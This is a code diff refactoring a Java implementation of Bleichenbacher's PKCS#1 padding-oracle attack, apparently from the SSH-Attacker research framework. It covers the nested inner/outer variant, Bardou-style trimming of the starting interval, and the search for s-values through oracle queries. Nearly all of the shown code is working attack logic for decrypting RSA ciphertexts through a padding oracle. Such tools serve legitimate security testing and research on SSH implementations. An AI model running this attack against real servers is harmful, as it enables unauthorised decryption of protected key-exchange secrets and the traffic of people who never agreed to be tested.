@@ -9,6 +9,7 @@ package de.rub.nds.sshattacker.attacks.pkcs1;
 
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.sshattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
+import de.rub.nds.sshattacker.attacks.pkcs1.util.MathHelper;
 import de.rub.nds.sshattacker.core.crypto.keys.CustomRsaPublicKey;
 import java.math.BigInteger;
 import java.security.InvalidKeyException;
@@ -16,8 +17,6 @@ import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
-import java.util.stream.Collectors;
-import java.util.stream.IntStream;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
@@ -28,6 +27,7 @@ import org.apache.logging.log4j.Logger;
 public class Bleichenbacher extends Pkcs1Attack {
 
     private static final Logger LOGGER = LogManager.getLogger();
+    // private MathHelper mathHelper = new MathHelper();
     CustomRsaPublicKey hostPublicKey;
     CustomRsaPublicKey serverPublicKey;
 
@@ -65,26 +65,6 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param b The BigInteger number that is the divisor.
      * @return The floor division of a by b as a BigInteger.
      */
-    private BigInteger floor(BigInteger a, BigInteger b) {
-        return a.divide(b);
-    }
-
-    /**
-     * Divides a BigInteger number 'a' by another BigInteger number 'b' and returns the ceiling of
-     * the result.
-     *
-     * @param a The BigInteger number to be divided
-     * @param b The BigInteger number that is the divisor
-     * @return The ceiling of the division result
-     */
-    private BigInteger ceil(BigInteger a, BigInteger b) {
-        BigInteger c = a.mod(b);
-        if (c.compareTo(BigInteger.ZERO) > 0) {
-            return a.divide(b).add(BigInteger.ONE);
-        } else {
-            return a.divide(b);
-        }
-    }
 
     /**
      * Manipulates the ciphertext by performing the following steps: 1. Computes the exponentiated
@@ -116,44 +96,26 @@ public class Bleichenbacher extends Pkcs1Attack {
      */
     private BigInteger find_smallest_s(
             BigInteger lowerBound, byte[] ciphertext, CustomRsaPublicKey rsaPublicKey) {
-        BigInteger s = lowerBound;
-        LOGGER.debug("Searching for smallest s, beginning at: {}", lowerBound.toString(16));
-        LOGGER.debug("Ciphertext: {} ", bytesToHex(ciphertext));
+        return find_smallest_s(lowerBound, ciphertext, rsaPublicKey, null);
+    }
 
-        while (true) {
-            // (c * pow(s,e,n)) % n
-            /*            BigInteger exponentiated =
-                    s.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
-            BigInteger cipher = new BigInteger(1, ciphertext);
-            BigInteger res = cipher.multiply(exponentiated);
-            BigInteger attempt = res.mod(rsaPublicKey.getModulus());
-            */
-
-            BigInteger attempt =
-                    manipulateCiphertext(
-                            s,
-                            rsaPublicKey.getPublicExponent(),
-                            rsaPublicKey.getModulus(),
-                            ciphertext);
-
-            boolean oracleResult = queryOracle(attempt, false);
-
-            if (counterOuterBleichenbacher == 0) {
-                LOGGER.fatal(
-                        ArrayConverter.bytesToHexString(
-                                ArrayConverter.bigIntegerToByteArray(attempt)));
-            }
-            counterOuterBleichenbacher++;
-
-            if (oracleResult) {
-                LOGGER.fatal(
-                        ArrayConverter.bytesToHexString(
-                                ArrayConverter.bigIntegerToByteArray(attempt)));
-                // System.exit(0);
-                return s;
-            }
-            s = s.add(BigInteger.ONE);
-        }
+    /**
+     * Searches for a valid s-value in a given range of possible s-values of a BB-Attack
+     *
+     * @param lowerBound the lower bound for the possible s-values
+     * @param upperBound the upper boud for the possible s-values
+     * @param previousS the last s which was found,
+     * @param ciphertext the ciphertext, for which the s-values should be found
+     * @param rsaPublicKey the public-key for which the s-values should be found
+     * @return
+     */
+    private BigInteger find_s_in_range(
+            BigInteger lowerBound,
+            BigInteger upperBound,
+            BigInteger previousS,
+            byte[] ciphertext,
+            CustomRsaPublicKey rsaPublicKey) {
+        return find_s_in_range(lowerBound, upperBound, previousS, ciphertext, rsaPublicKey, null);
     }
 
     /**
@@ -166,17 +128,16 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param outerKey the rsa-public-key for the outer encryption, encrypting the generated s-value
      * @return the smallest s-value, which generates a valid PKCS#1 Ciphertext
      */
-    private BigInteger find_smallest_s_nested(
+    private BigInteger find_smallest_s(
             BigInteger lowerBound,
             byte[] ciphertext,
             CustomRsaPublicKey rsaPublicKey,
             CustomRsaPublicKey outerKey) {
+
         BigInteger s = lowerBound;
-        // LOGGER.debug("Searching for smallest s, beginning at: {}", lowerBound.toString(16));
-        // LOGGER.debug("Ciphertext: {}", bytesToHex(ciphertext));
+        boolean oracleResult;
 
         while (true) {
-            // (c * pow(s,e,n)) % n
             BigInteger attempt =
                     manipulateCiphertext(
                             s,
@@ -184,16 +145,26 @@ public class Bleichenbacher extends Pkcs1Attack {
                             rsaPublicKey.getModulus(),
                             ciphertext);
 
-            BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
+            if (outerKey != null) {
+                BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
 
-            boolean oracleResult = queryOracle(encryptedAttempt, true);
-            counterInnerBleichenbacher++;
+                oracleResult = queryOracle(encryptedAttempt, true);
+                counterInnerBleichenbacher++;
 
+            } else {
+                oracleResult = queryOracle(attempt, false);
+
+                if (counterOuterBleichenbacher == 0) {
+                    LOGGER.fatal(
+                            ArrayConverter.bytesToHexString(
+                                    ArrayConverter.bigIntegerToByteArray(attempt)));
+                }
+                counterOuterBleichenbacher++;
+            }
             if (oracleResult) {
                 LOGGER.fatal(
                         ArrayConverter.bytesToHexString(
-                                ArrayConverter.bigIntegerToByteArray(encryptedAttempt)));
-                LOGGER.debug("Found smallest s: {}", s);
+                                ArrayConverter.bigIntegerToByteArray(attempt)));
                 return s;
             }
 
@@ -213,41 +184,32 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param outerKey the outer encryption key
      * @return
      */
-    private BigInteger find_s_in_range_nested(
+    private BigInteger find_s_in_range(
             BigInteger lowerBound,
             BigInteger upperBound,
             BigInteger previousS,
             byte[] ciphertext,
             CustomRsaPublicKey rsaPublicKey,
             CustomRsaPublicKey outerKey) {
-        /*      LOGGER.debug(
-        "Searching for s in range from {} to {}",
-        lowerBound.toString(16),
-        upperBound.toString(16));*/
 
+        boolean oracleResult;
         //  ri = ceil(2 * (b * prev_s - 2 * B), n)
         BigInteger bTimesPrevs = upperBound.multiply(previousS);
         BigInteger bTimePrevsSubTwoB = bTimesPrevs.subtract(two_B);
-        BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());
+        BigInteger ri =
+                MathHelper.ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());
 
         while (true) {
 
             // si_lower = ceil(2 * B + ri * n, b)
             // si_upper = ceil(3 * B + ri * n, a)
             BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
-            BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
-            BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);
+            BigInteger si_lower = MathHelper.ceil(two_B.add(rITimesN), upperBound);
+            BigInteger si_upper = MathHelper.ceil(three_B.add(rITimesN), lowerBound);
 
             for (BigInteger si = si_lower;
                     si.compareTo(si_upper) < 0;
                     si = si.add(BigInteger.ONE)) {
-
-                // (c * pow(si, e, n)) % n
-                /*                BigInteger exponentiated =
-                        si.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
-                BigInteger cipher = new BigInteger(1, ciphertext);
-                BigInteger res = cipher.multiply(exponentiated);
-                BigInteger attempt = res.mod(rsaPublicKey.getModulus());*/
 
                 BigInteger attempt =
                         manipulateCiphertext(
@@ -256,80 +218,20 @@ public class Bleichenbacher extends Pkcs1Attack {
                                 rsaPublicKey.getModulus(),
                                 ciphertext);
 
-                BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
-                boolean oracleResult = queryOracle(encryptedAttempt, true);
-                counterInnerBleichenbacher++;
+                if (outerKey != null) {
+                    BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
+                    oracleResult = queryOracle(encryptedAttempt, true);
+                    counterInnerBleichenbacher++;
+                } else {
+                    oracleResult = queryOracle(attempt, false);
+                    counterOuterBleichenbacher++;
+                }
 
                 if (oracleResult) {
                     return si;
                 }
             }
 
-            ri = ri.add(BigInteger.ONE);
-        }
-    }
-
-    /**
-     * Searches for a valid s-value in a given range of possible s-values of a BB-Attack
-     *
-     * @param lowerBound the lower bound for the possible s-values
-     * @param upperBound the upper boud for the possible s-values
-     * @param previousS the last s which was found,
-     * @param ciphertext the ciphertext, for which the s-values should be found
-     * @param rsaPublicKey the public-key for which the s-values should be found
-     * @return
-     */
-    private BigInteger find_s_in_range(
-            BigInteger lowerBound,
-            BigInteger upperBound,
-            BigInteger previousS,
-            byte[] ciphertext,
-            CustomRsaPublicKey rsaPublicKey) {
-        /*
-                LOGGER.debug(
-                        "Searching for s in range from {} to {}",
-                        lowerBound.toString(16),
-                        upperBound.toString(16));
-        */
-
-        //  ri = ceil(2 * (b * prev_s - 2 * B), n)
-        BigInteger bTimesPrevs = upperBound.multiply(previousS);
-        BigInteger bTimePrevsSubTwoB = bTimesPrevs.subtract(two_B);
-        BigInteger ri = ceil(big_two.multiply(bTimePrevsSubTwoB), rsaPublicKey.getModulus());
-
-        while (true) {
-
-            // si_lower = ceil(2 * B + ri * n, b)
-            // si_upper = ceil(3 * B + ri * n, a)
-            BigInteger rITimesN = ri.multiply(rsaPublicKey.getModulus());
-            BigInteger si_lower = ceil(two_B.add(rITimesN), upperBound);
-            BigInteger si_upper = ceil(three_B.add(rITimesN), lowerBound);
-
-            for (BigInteger si = si_lower;
-                    si.compareTo(si_upper) < 0;
-                    si = si.add(BigInteger.ONE)) {
-
-                // (c * pow(si, e, n)) % n
-                /*                BigInteger exponentiated =
-                        si.modPow(rsaPublicKey.getPublicExponent(), rsaPublicKey.getModulus());
-                BigInteger cipher = new BigInteger(1, ciphertext);
-                BigInteger res = cipher.multiply(exponentiated);
-                BigInteger attempt = res.mod(rsaPublicKey.getModulus());*/
-
-                BigInteger attempt =
-                        manipulateCiphertext(
-                                si,
-                                rsaPublicKey.getPublicExponent(),
-                                rsaPublicKey.getModulus(),
-                                ciphertext);
-
-                boolean oracleResult = queryOracle(attempt, false);
-                counterOuterBleichenbacher++;
-
-                if (oracleResult) {
-                    return si;
-                }
-            }
             ri = ri.add(BigInteger.ONE);
         }
     }
@@ -350,12 +252,6 @@ public class Bleichenbacher extends Pkcs1Attack {
                 BigInteger lb = chosenInterval.lower.min(intervalToInsert.lower);
                 BigInteger ub = chosenInterval.upper.max(intervalToInsert.upper);
                 M.set(i, new Interval(lb, ub));
-                /*                LOGGER.debug(
-                "Overlap found, inserting lowerBound: {} upperboudn: {} into new M [{}] = {}",
-                lb.toString(16),
-                ub.toString(16),
-                i,
-                M.toString());*/
                 return M;
             }
         }
@@ -382,53 +278,31 @@ public class Bleichenbacher extends Pkcs1Attack {
             BigInteger lowerTimesS = chosenInterval.lower.multiply(s);
             BigInteger lowerPartForCeil = lowerTimesS.subtract(three_B_plus_one);
 
-            BigInteger r_lower = ceil(lowerPartForCeil, rsaPublicKey.getModulus());
+            BigInteger r_lower = MathHelper.ceil(lowerPartForCeil, rsaPublicKey.getModulus());
 
-            /*           LOGGER.debug(
-                                "found r_lower: {} from lowerPartForCeil: {}",
-                                r_lower.toString(16),
-                                lowerPartForCeil.toString(16));
-            */
             /*
                 b * s - 2 * B
             */
             BigInteger upperTimesS = chosenInterval.upper.multiply(s);
             BigInteger upperPartForCeil = upperTimesS.subtract(two_B);
-            BigInteger r_upper = ceil(upperPartForCeil, rsaPublicKey.getModulus());
-            /*
-                        LOGGER.debug(
-                                "found r_upper: {} from upperPartForCeil: {}",
-                                r_upper.toString(16),
-                                upperPartForCeil.toString(16));
-
-                        LOGGER.debug("Compare:{}", r_lower.compareTo(r_upper));
-            */
+            BigInteger r_upper = MathHelper.ceil(upperPartForCeil, rsaPublicKey.getModulus());
 
             for (BigInteger r = r_lower; r.compareTo(r_upper) < 0; r = r.add(BigInteger.ONE)) {
                 BigInteger lowerBound = chosenInterval.lower;
                 BigInteger upperBound = chosenInterval.upper;
 
                 BigInteger lowerUpperBound =
-                        ceil(two_B.add(r.multiply(rsaPublicKey.getModulus())), s);
+                        MathHelper.ceil(two_B.add(r.multiply(rsaPublicKey.getModulus())), s);
                 lowerBound = lowerBound.max(lowerUpperBound);
-                // LOGGER.debug("found lowerBound: {}", lowerBound.toString(16));
 
                 BigInteger upperUpperBound =
-                        floor(three_B_sub_one.add(r.multiply(rsaPublicKey.getModulus())), s);
+                        MathHelper.floor(
+                                three_B_sub_one.add(r.multiply(rsaPublicKey.getModulus())), s);
                 upperBound = upperBound.min(upperUpperBound);
-                // LOGGER.debug("found upperBound: {}", upperBound.toString(16));
 
                 Interval interim_interval = new Interval(lowerBound, upperBound);
-                /*LOGGER.debug(
-                                        "new Interval to insert lower: {} upper: {}",
-                                        interim_interval.lower.toString(16),
-                                        interim_interval.upper.toString(16));
-                */
+
                 M_new = safeIntervalInsert(M_new, interim_interval);
-                /*LOGGER.debug(
-                "safeinserting in M_new lower: {} M upper: {}",
-                M_new.get(0).lower.toString(16),
-                M_new.get(0).upper.toString(16));*/
             }
         }
 
@@ -482,14 +356,8 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_sub_one = three_B.subtract(BigInteger.ONE);
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
-        // LOGGER.debug("Starting with outer BB {} ", ArrayConverter.bytesToHexString(ciphertext));
-        byte[] encoded_inner_ciphertext = bleichenbacher(ciphertext, outerPublicKey, classic);
-        // LOGGER.debug("got inner BB {}", ArrayConverter.bytesToHexString(ciphertext));
+        byte[] encoded_inner_ciphertext = outerBleichenbacher(ciphertext, outerPublicKey, classic);
         byte[] innerCiphertext = pkcs1Decode(encoded_inner_ciphertext);
-        // LOGGER.debug("Decoded inner BB into {}",
-        // ArrayConverter.bytesToHexString(innerCiphertext));
-
-        // LOGGER.debug("Switching to inner Ciphertext, cracked outer successful");
 
         B = big_two.pow(8 * (innerK - 2));
         two_B = B.multiply(big_two);
@@ -498,6 +366,91 @@ public class Bleichenbacher extends Pkcs1Attack {
         three_B_plus_one = three_B.add(BigInteger.ONE);
 
         return innerBleichenbacher(innerCiphertext, innerPublicKey, outerPublicKey, classic);
+    }
+
+    private List<Interval> trimM0(
+            byte[] ciphertext,
+            CustomRsaPublicKey innerPublicKey,
+            CustomRsaPublicKey outerPublicKey,
+            int maxTrimmers) {
+
+        List<Interval> M = new ArrayList<>();
+
+        ArrayList<int[]> trimmers = new ArrayList<>();
+        trimmers = getPaires(maxTrimmers);
+        ArrayList<int[]> utPairs = new ArrayList<>();
+
+        for (int[] ut : trimmers) {
+            int u = ut[0];
+            int t = ut[1];
+
+            BigInteger uBI = BigInteger.valueOf(u);
+            BigInteger tBI = BigInteger.valueOf(t);
+
+            BigInteger cipherbig = new BigInteger(1, ciphertext);
+
+            BigInteger result =
+                    cipherbig
+                            .multiply(
+                                    (uBI.multiply(tBI.modInverse(innerPublicKey.getModulus())))
+                                            .modPow(
+                                                    innerPublicKey.getPublicExponent(),
+                                                    innerPublicKey.getModulus()))
+                            .mod(innerPublicKey.getModulus());
+            if (outerPublicKey != null) {
+                BigInteger encryptedAttempt = encryptBigInt(result, outerPublicKey);
+
+                if (queryOracle(
+                        encryptedAttempt,
+                        true)) { // assuming the oracle and util method exists and does what
+                    // expected
+                    utPairs.add(new int[] {u, t});
+                }
+            } else {
+                if (queryOracle(result, false)) {
+                    utPairs.add(new int[] {u, t});
+                }
+            }
+        }
+
+        if (!utPairs.isEmpty()) {
+
+            ArrayList<Integer> t_values = new ArrayList<>();
+            for (int[] pair : utPairs) {
+                t_values.add(pair[1]);
+            }
+
+            int t_prime = MathHelper.findLeastCommonMultiple(t_values);
+
+            int u_min = Integer.MAX_VALUE;
+            int u_max = Integer.MIN_VALUE;
+            for (int[] pair : utPairs) {
+                int current = pair[0] * t_prime / pair[1];
+                if (current < u_min) {
+                    u_min = current;
+                }
+                if (current > u_max) {
+                    u_max = current;
+                }
+            }
+
+            BigInteger a =
+                    two_B.multiply(BigInteger.valueOf(t_prime)).divide(BigInteger.valueOf(u_min));
+            BigInteger b =
+                    three_B_sub_one
+                            .multiply(BigInteger.valueOf(t_prime))
+                            .divide(BigInteger.valueOf(u_max));
+
+            M = new ArrayList<>();
+            M.add(new Interval(a, b));
+            LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
+
+        } else {
+            LOGGER.debug("utPaires where empty, falling back to 2B and 3B-1");
+            M = new ArrayList<>();
+            M.add(new Interval(two_B, three_B_sub_one));
+        }
+        return M;
     }
 
     /**
@@ -535,102 +488,16 @@ public class Bleichenbacher extends Pkcs1Attack {
                 M.get(0).lower.toString(16),
                 M.get(0).upper.toString(16));
         if (!classic) {
-            ArrayList<int[]> trimmers = new ArrayList<>();
-            for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
-                if (t <= 50) {
-                    for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
-                        if (BigInteger.valueOf(u)
-                                .gcd(BigInteger.valueOf(t))
-                                .equals(BigInteger.ONE)) {
-                            trimmers.add(new int[] {u, t});
-                        }
-                    }
-                } else { // t > 50
-                    trimmers.add(new int[] {t - 1, t});
-                    trimmers.add(new int[] {t + 1, t});
-                }
-            }
-            ArrayList<int[]> utPairs = new ArrayList<>();
 
-            for (int[] ut : trimmers) {
-                int u = ut[0];
-                int t = ut[1];
-
-                BigInteger uBI = BigInteger.valueOf(u);
-                BigInteger tBI = BigInteger.valueOf(t);
-
-                BigInteger cipherbig = new BigInteger(1, ciphertext);
-
-                BigInteger result =
-                        cipherbig
-                                .multiply(
-                                        (uBI.multiply(tBI.modInverse(innerPublicKey.getModulus())))
-                                                .modPow(
-                                                        innerPublicKey.getPublicExponent(),
-                                                        innerPublicKey.getModulus()))
-                                .mod(innerPublicKey.getModulus());
-
-                BigInteger encryptedAttempt = encryptBigInt(result, outerPublicKey);
-
-                if (queryOracle(
-                        encryptedAttempt,
-                        true)) { // assuming the oracle and util method exists and does what
-                    // expected
-                    utPairs.add(new int[] {u, t});
-                }
-            }
-
-            if (!utPairs.isEmpty()) {
-
-                ArrayList<Integer> t_values = new ArrayList<>();
-                for (int[] pair : utPairs) {
-                    t_values.add(pair[1]);
-                }
-
-                int t_prime = lcm_n(t_values);
-
-                int u_min = Integer.MAX_VALUE;
-                int u_max = Integer.MIN_VALUE;
-                for (int[] pair : utPairs) {
-                    int current = pair[0] * t_prime / pair[1];
-                    if (current < u_min) {
-                        u_min = current;
-                    }
-                    if (current > u_max) {
-                        u_max = current;
-                    }
-                }
-
-                BigInteger a =
-                        two_B.multiply(BigInteger.valueOf(t_prime))
-                                .divide(BigInteger.valueOf(u_min));
-                BigInteger b =
-                        three_B_sub_one
-                                .multiply(BigInteger.valueOf(t_prime))
-                                .divide(BigInteger.valueOf(u_max));
-
-                M = new ArrayList<>();
-                M.add(new Interval(a, b));
-                LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
-            } else {
-                LOGGER.debug("UT-Paris where empty");
-            }
-
-            s =
-                    find_smallest_s_nested(
-                            ceil(innerPublicKey.getModulus().add(two_B), M.get(0).lower),
-                            ciphertext,
-                            innerPublicKey,
-                            outerPublicKey);
-
-        } else {
-            s =
-                    find_smallest_s_nested(
-                            ceil(innerPublicKey.getModulus(), three_B),
-                            ciphertext,
-                            innerPublicKey,
-                            outerPublicKey);
+            M = trimM0(ciphertext, innerPublicKey, outerPublicKey, 5000);
         }
+
+        s =
+                find_smallest_s(
+                        MathHelper.ceil(innerPublicKey.getModulus().add(two_B), M.get(0).upper),
+                        ciphertext,
+                        innerPublicKey,
+                        outerPublicKey);
 
         LOGGER.debug(
                 "found s, initial updating M lower: {} M upper: {}",
@@ -643,7 +510,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         while (true) {
             if (M.size() >= 2) {
                 s =
-                        find_smallest_s_nested(
+                        find_smallest_s(
                                 s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
             } else if (M.size() == 1) {
                 BigInteger a = M.get(0).lower;
@@ -651,40 +518,10 @@ public class Bleichenbacher extends Pkcs1Attack {
                 if (a.equals(b)) {
                     return ArrayConverter.bigIntegerToByteArray(a);
                 }
-                s = find_s_in_range_nested(a, b, s, ciphertext, innerPublicKey, outerPublicKey);
+                s = find_s_in_range(a, b, s, ciphertext, innerPublicKey, outerPublicKey);
             }
             M = updateInterval(M, s, innerPublicKey);
         }
-    }
-
-    // Define the lcm method
-    public static int lcm(int a, int b) {
-        int tempA = a;
-        int tempB = b;
-        while (tempB != 0) {
-            int temp = tempB;
-            tempB = tempA % tempB;
-            tempA = temp;
-        }
-        return a * (b / tempA);
-    }
-
-    // Define the lcm_n method
-    public static int lcm_n(ArrayList<Integer> list) {
-        ArrayList<Integer> ns = new ArrayList<>(list);
-        int log = (int) (Math.log(ns.size()) / Math.log(2) + 1);
-        for (int i = 0; i < log; i++) {
-            ArrayList<Integer> finalNs = ns;
-            List<Integer> nsNext =
-                    IntStream.range(0, ns.size() / 2)
-                            .mapToObj(k -> lcm(finalNs.get(2 * k), finalNs.get(2 * k + 1)))
-                            .collect(Collectors.toList());
-            if (ns.size() % 2 != 0) {
-                nsNext.add(ns.get(ns.size() - 1));
-            }
-            ns = new ArrayList<>(nsNext);
-        }
-        return ns.get(0);
     }
 
     /**
@@ -694,8 +531,9 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param publicKey The known public key, which was used to encrypt the ciphertext
      * @return the decrypted ciphertext, whith a valid PKCS#1 Padding
      */
-    private byte[] bleichenbacher(
+    private byte[] outerBleichenbacher(
             byte[] ciphertext, CustomRsaPublicKey publicKey, boolean classic) {
+        MathHelper mathHelper = new MathHelper();
         int bitsize = publicKey.getModulus().bitLength();
         int k = bitsize / 8;
 
@@ -719,96 +557,15 @@ public class Bleichenbacher extends Pkcs1Attack {
         BigInteger s;
 
         if (!classic) {
-            ArrayList<int[]> trimmers = new ArrayList<>();
-            for (int t = 2; t <= Math.pow(2, 12) + 1; t++) {
-                if (t <= 50) {
-                    for (int u = Math.floorDiv(2 * t, 3); u <= Math.floorDiv(3 * t, 2); u++) {
-                        if (BigInteger.valueOf(u)
-                                .gcd(BigInteger.valueOf(t))
-                                .equals(BigInteger.ONE)) {
-                            trimmers.add(new int[] {u, t});
-                        }
-                    }
-                } else { // t > 50
-                    trimmers.add(new int[] {t - 1, t});
-                    trimmers.add(new int[] {t + 1, t});
-                }
-            }
-            ArrayList<int[]> utPairs = new ArrayList<>();
-
-            for (int[] ut : trimmers) {
-                int u = ut[0];
-                int t = ut[1];
-
-                BigInteger uBI = BigInteger.valueOf(u);
-                BigInteger tBI = BigInteger.valueOf(t);
-
-                BigInteger cipherbig = new BigInteger(1, ciphertext);
-
-                BigInteger result =
-                        cipherbig
-                                .multiply(
-                                        (uBI.multiply(tBI.modInverse(publicKey.getModulus())))
-                                                .modPow(
-                                                        publicKey.getPublicExponent(),
-                                                        publicKey.getModulus()))
-                                .mod(publicKey.getModulus());
-
-                if (queryOracle(
-                        result,
-                        false)) { // assuming the oracle and util method exists and does what
-                    // expected
-                    utPairs.add(new int[] {u, t});
-                }
-            }
-
-            if (!utPairs.isEmpty()) {
-
-                ArrayList<Integer> t_values = new ArrayList<>();
-                for (int[] pair : utPairs) {
-                    t_values.add(pair[1]);
-                }
-
-                int t_prime = lcm_n(t_values);
-
-                int u_min = Integer.MAX_VALUE;
-                int u_max = Integer.MIN_VALUE;
-                for (int[] pair : utPairs) {
-                    int current = pair[0] * t_prime / pair[1];
-                    if (current < u_min) {
-                        u_min = current;
-                    }
-                    if (current > u_max) {
-                        u_max = current;
-                    }
-                }
-
-                BigInteger a =
-                        two_B.multiply(BigInteger.valueOf(t_prime))
-                                .divide(BigInteger.valueOf(u_min));
-                BigInteger b =
-                        three_B_sub_one
-                                .multiply(BigInteger.valueOf(t_prime))
-                                .divide(BigInteger.valueOf(u_max));
-
-                M = new ArrayList<>();
-                M.add(new Interval(a, b));
-                LOGGER.debug("done. trimming M0 iterations: [{},{}]", a, b);
-            } else {
-                LOGGER.debug("UT-Paris where empty");
-            }
-
             // Search for s1 with improved start-conditions from Bardou
-            s =
-                    find_smallest_s(
-                            ceil(publicKey.getModulus().add(two_B), M.get(0).lower),
-                            ciphertext,
-                            publicKey);
-
-        } else {
-            // do the regular search for s1 as described in the original paper
-            s = find_smallest_s(ceil(publicKey.getModulus(), three_B), ciphertext, publicKey);
+            M = trimM0(ciphertext, publicKey, null, 1000);
         }
+
+        s =
+                find_smallest_s(
+                        mathHelper.ceil(publicKey.getModulus().add(two_B), M.get(0).upper),
+                        ciphertext,
+                        publicKey);
 
         LOGGER.debug(
                 "found s, initial updating M lower: {} M upper: {}",
@@ -845,6 +602,60 @@ public class Bleichenbacher extends Pkcs1Attack {
             result.append(String.format("%02x", b));
         }
         return result.toString();
+    }
+
+    private BigInteger[] ensureRange(BigInteger ucandidate, BigInteger tcandidate) {
+        float quotient = ucandidate.floatValue() / tcandidate.floatValue();
+
+        // if we get to big - choose next value for t, reset u to 1
+        if (quotient >= (3.0F / 2.0F)) {
+            ucandidate = BigInteger.valueOf(1);
+            tcandidate = tcandidate.add(BigInteger.ONE);
+            quotient = ucandidate.floatValue() / tcandidate.floatValue();
+        }
+        // test if wie are too small, add up u until we are above 2/3
+        while (quotient <= (2.0F / 3.0F)) {
+            ucandidate = ucandidate.add(BigInteger.ONE);
+            quotient = ucandidate.floatValue() / tcandidate.floatValue();
+        }
+
+        // return if the range is hold
+        return new BigInteger[] {ucandidate, tcandidate};
+    }
+
+    /**
+     * Retrieves u/t paires for improved bb attack as mentioned by Bardou 2012
+     *
+     * @param maxPairs the maximum number of pairs to retrieve
+     * @return an ArrayList of int arrays representing the pairs of integers
+     */
+    private ArrayList<int[]> getPaires(int maxPairs) {
+        ArrayList<int[]> paires = new ArrayList<>();
+        BigInteger u = BigInteger.valueOf(1);
+        BigInteger t = BigInteger.valueOf(2);
+
+        // as long as we are not above t < 2^12 and the max number of paires isn`t reached - go on
+        // searching
+        while ((t.compareTo(BigInteger.valueOf(2).pow(12)) < 0) && paires.size() < maxPairs) {
+            BigInteger[] result = ensureRange(u, t);
+            u = result[0];
+            t = result[1];
+
+            // while u and t are not coprime - add up u and test again
+            // every run test if we are in range, otherwise correct
+            while (u.gcd(t).compareTo(BigInteger.valueOf(1)) != 0) {
+                u = u.add(BigInteger.ONE);
+                BigInteger[] result2 = ensureRange(u, t);
+                u = result2[0];
+                t = result2[1];
+            }
+
+            // Pair found -> add to paires and add u one up
+            paires.add(new int[] {u.intValue(), t.intValue()});
+            u = u.add(BigInteger.ONE);
+        }
+
+        return paires;
     }
 
     /**
@@ -904,15 +715,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         return counterInnerBleichenbacher;
     }
 
-    public void setCounterInnerBleichenbacher(int counterInnerBleichenbacher) {
-        this.counterInnerBleichenbacher = counterInnerBleichenbacher;
-    }
-
     public int getCounterOuterBleichenbacher() {
         return counterOuterBleichenbacher;
-    }
-
-    public void setCounterOuterBleichenbacher(int counterOuterBleichenbacher) {
-        this.counterOuterBleichenbacher = counterOuterBleichenbacher;
     }
 }
